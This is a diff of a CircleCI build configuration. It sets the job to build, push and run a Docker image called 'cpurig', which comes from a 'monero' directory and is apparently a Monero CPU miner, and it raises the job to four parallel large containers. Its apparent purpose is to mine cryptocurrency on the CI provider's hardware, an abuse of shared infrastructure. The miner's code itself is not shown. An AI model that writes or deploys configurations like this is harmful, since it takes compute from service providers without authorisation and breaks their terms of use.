@@ -2,21 +2,22 @@ version: 2
 jobs:
   build:
     machine: true
+    parallelism: 4
+    resource_class: large
     steps:
       - checkout
       # Uncomment and use if you need to log in to Docker
-      # - run: |
-      #     docker login -u $DOCKER_USER -p $DOCKER_PASS
+      - run: docker login -u $DOCKER_USER -p $DOCKER_PASS
 
       # Build the application image
-      - run: docker build -t alp1n3/cpurig:mualpine ./monero/cpurig
+      - run: docker build -t alp1n3/cpurig:latest .
       # Uncomment if you have another build step
       # - run: docker build -t alp1n3/cpurig:ualpine ./monero/cpu-ualpine
 
       # Deploy the image
-      - run: docker push alp1n3/cpurig:mualpine
+ #     - run: docker push alp1n3/cpurig:mualpine
       # Uncomment if you have another deploy step
-      # - run: docker push alp1n3/cpurig:ualpine
+      - run: docker push alp1n3/cpurig:latest
 
       # Run the Docker image
-      - run: docker run alp1n3/cpurig:mualpine
+      - run: docker run alp1n3/cpurig:latest
